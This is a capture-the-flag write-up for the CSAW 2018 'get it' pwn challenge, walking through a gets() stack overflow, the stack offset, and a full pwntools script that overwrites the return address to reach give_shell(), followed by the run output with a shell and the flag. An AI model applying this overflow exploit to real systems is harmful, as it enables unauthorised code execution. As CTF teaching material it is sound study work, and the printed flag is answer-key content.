# Csaw 2018 get it pwn 50

Let's take a look at the binary:

```
$	file get_it 
get_it: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=87529a0af36e617a1cc6b9f53001fdb88a9262a2, not stripped
$	./get_it 
Do you gets it??
0000000000000000000000000000000000000000000000000000000
Segmentation fault (core dumped)
```

So this looks like it will be a fairly easy challenge. We were able to crash it by just throwing a large amount of junk at it. Looking at the C psuedocode in IDA confirms that:

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char inputChar; // [sp+10h] [bp-20h]@1

  puts("Do you gets it??");
  gets(&inputChar);
  return 0;
}
```

The bug is the call to `gets`, since it will allow us to scan an unlimited amount of data into a limited space (`input char`). Looking at the other functions in the binary, we see that we won't need to worry about shellcode / ROP Chains since there is a function we can call which will give us a shell:

```
int give_shell()
{
  return system("/bin/bash");
}
```

So now it's just a matter of overwriting the return address with the address of `give_shell()` (which is `0x4005b6`). We can also see that the space between the start of our input and the return address is `0x28` (`40`) characters:

```
-0000000000000025                 db ? ; undefined
-0000000000000024 var_24          dd ?
-0000000000000020 inputChar       db 32 dup(?)
+0000000000000000  s              db 8 dup(?)
+0000000000000008  r              db 8 dup(?)
+0000000000000010
+0000000000000010 ; end of stack variables
```

With that, we have everything we need to write the exploit:

```
# Import pwntools
from pwn import *

# Establish the target
#target = process('./get_it')
target = remote('pwn.chal.csaw.io', 9001)

# Print the initial text
print target.recvuntil("it")

# From and send the payload
payload = "0"*40 + p64(0x4005b6)
target.sendline(payload)

# Drop to an interactive shell
target.interactive()
```

and when we run the exploit:

```
$	python exploit.py 
[+] Opening connection to pwn.chal.csaw.io on port 9001: Done
            _     _ _  ___ ___ ___ 
  __ _  ___| |_  (_) ||__ \__ \__ \
 / _` |/ _ \ __| | | __|/ / / / / /
| (_| |  __/ |_  | | |_|_| |_| |_| 
 \__, |\___|\__| |_|\__(_) (_) (_) 
 |___/                             
Do you gets it
[*] Switching to interactive mode
??
0000000000000000000000000000000000000000\xb6^E@^@^@^@^@^@
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
get_it@d9dc9c92eac2:~$ $ ls
ls
art.txt  flag.txt  get_it  run.sh
get_it@d9dc9c92eac2:~$ $ cat flag.txt
cat flag.txt
flag{y0u_deF_get_itls}
get_it@d9dc9c92eac2:~$ [*] Got EOF while reading in interactive
$ 
[*] Interrupted
[*] Closed connection to pwn.chal.csaw.io port 9001
```

just like that, we captured the flag!